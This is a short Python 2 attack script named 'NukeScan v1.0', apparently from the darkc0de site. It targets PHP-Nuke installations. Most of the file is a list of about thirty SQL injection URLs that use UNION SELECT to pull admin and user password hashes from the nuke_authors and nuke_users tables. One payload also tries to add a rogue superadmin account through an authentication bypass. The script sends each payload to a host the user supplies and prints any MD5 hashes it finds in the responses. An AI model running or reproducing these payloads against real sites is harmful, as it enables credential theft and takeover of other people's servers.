#!usr/bin/python
#Scans vulns in php-nuke and searches for md5

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import sys, re, urllib2, socket

print "\n\t   d3hydr8[at]gmail[dot]com NukeScan v1.0"
print "\t--------------------------------------------"

if len(sys.argv) != 2:
	print "\nUsage: ./nukescan.py <php-nuke path>"
	print "Ex: ./nukescan.py www.test.com/phpnuke/\n"
	sys.exit(1)

paths = ["modules.php?name=Downloads&d_op=viewdownload&cid=59%20or%20cid=2",
		"modules.php?name=Reviews&rop=showcontent&id=-1%20UNION%20SELECT%200,0,aid,pwd,email,email,100,pwd,url,url,10000,name%20FROM%20nuke_authors/",
		"modules.php?name=Sections&op=viewarticle&artid=-1%20UNION%20SELECT%200,0,aid,pwd,0%20FROM%20nuke_authors",
		"modules.php?name=Sections&op=printpage&artid=-1%20UNION%20SELECT%20aid,pwd%20FROM%20nuke_authors",
		"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%200,0,pwd,0,0%20FROM%20nuke_authors%20WHERE%201/",
		"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
		"modules.php?name=Downloads&d_op=viewdownloadeditorial&lid=-1%20UNION%20SELECT%20username,1,user_password,user_id%20FROM%20nuke_users",
		"modules.php?name=Downloads&d_op=viewdownloadcomments&lid=-1%20UNION%20SELECT%20username,user_id,user_password,1%20FROM%20nuke_users/",
		"modules.php?name=Sections&op=listarticles&secid=-1%20UNION%20SELECT%20pwd%20FROM%20nuke_authors",
		"modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala",
		"index.php?&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
		"modules.php?name=Journal&file=search&bywhat=aid&exact=1&forwhat=kala'/**/UNION/**/SELECT/**/0,0,pwd,0,0,0,0,0,0/**/FROM/**/nuke_authors/**/WHERE/**/radminsuper=1/**/LIMIT/**/1/*",
		"admin.php?op=AddAuthor&add_aid=x0p0x&add_name=God&add_pwd=cool&add_email=bugs@victima&add_radminsuper=1&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox",
		"modules.php?name=Private_Messages&file=index&folder=savebox&mode=read&p=99&pm_sql_user=AND%20pm.privmsgs_type=-99%20UNION%20SELECT%20aid,null,pwd,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20nuke_authors%20WHERE%20radminsuper=1%20LIMIT%201/",
		"modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
		"modules.php?name=Web_Links&l_op=viewlink&cid=1%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors%20LIMIT%201,2",
		"modules.php?name=Web_Links&l_op=viewlink&cid=0%20UNION%20SELECT%20pwd,0%20FROM%20nuke_authors",
		"modules.php?name=Downloads&d_op=getit&lid=-1%20UNION%20SELECT%20user_password%20FROM%20nuke_users%20WHERE%20user_id=5",
		"modules.php?name=Web_Links&l_op=viewlinkeditorial&lid=-1%20UNION%20SELECT%20name,1,pwd,aid%20FROM%20nuke_authors",
		"modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(111,112,101,114,110,97,108,101,51),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2Fnuke_users/*where%20admin%201=%201",
		"modules.php?op=modload&name=books&file=index&req=view_cat&cid=-90900%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/char(121,122,111,104,110,97,112,101,54),concat(pn_uname,0x3a,pn_pass)+from%2F%2A%2A%2FpostNuke_users/*where%20admin%201=%201",
		"modules.php?name=Sections&op=viewarticle&artid=-9999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
		"modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,aid/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
		"modules.php?op=modload&name=EasyContent&file=index&menu=410&page_id=-1/**/union/**/select/**/0,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*","modules.php?name=Okul&op=okullar&okulid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
		"modules.php?name=Docum&op=viewarticle&artid=-1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%20%20/**/0,1,aid,pwd,4/**/from/**/nuke_authors/*where%20admin%20-2",
		"modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/aid,2/**/from/**/nuke_authors/*where%20admin%20-2",
		"modules.php?name=Inhalt&sop=listpages&cid=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
		"modules.php?name=Manuales&d_op=viewdownload&cid=1/**/union/**/select/**/0,aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*",
		"modules.php?name=Siir&op=print&id=-9999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/0,aid,pwd,pwd,4/**/from+nuke_authors/*where%20admin%201%200%202",
		"modules.php?name=NukeC&op=ViewCatg&id_catg=-1/**/union/**/select/**/pwd,2/**/from/**/nuke_authors/*where%20admin%20-2",
		"modules.php?name=Kose_Yazilari&op=viewarticle&artid=-11223344%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0,1,aid,pwd,4,5%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
		"modules.php?name=Kose_Yazilari&op=printpage&artid=-99999999%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F0,pwd,aid,3%2F%2A%2A%2Ffrom%2F%2A%2A%2Fnuke_authors",
		"modules.php?op=modload&name=My_eGallery&file=index&do=showgall&gid=-1/**/union/**/select/**/aid,pwd/**/from/**/nuke_authors/**/where/**/radminsuper=1/*"]
		
socket.setdefaulttimeout(10)
host = sys.argv[1]
print "[+] NukePath:",host
print "[+] Vuln. Loaded:",len(paths)
if host[:7] != "http://":
	host = "http://"+host
if host[-1:] != "/":
	host = host+"/"
print "[+] Testing..."
for path in paths:
	try:
		#print host+path
		source = urllib2.urlopen(host+path, "80").read()
		md5s = re.findall("[a-f0-9]"*32,source)
		if len(md5s) >=1:
			print "\nHost:",host+path
			print "Found:"
			for md5 in md5s:
				print "\t-",md5
	except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error):
		pass
	except(KeyboardInterrupt):
		pass
print "\n[-] Done\n"
 	
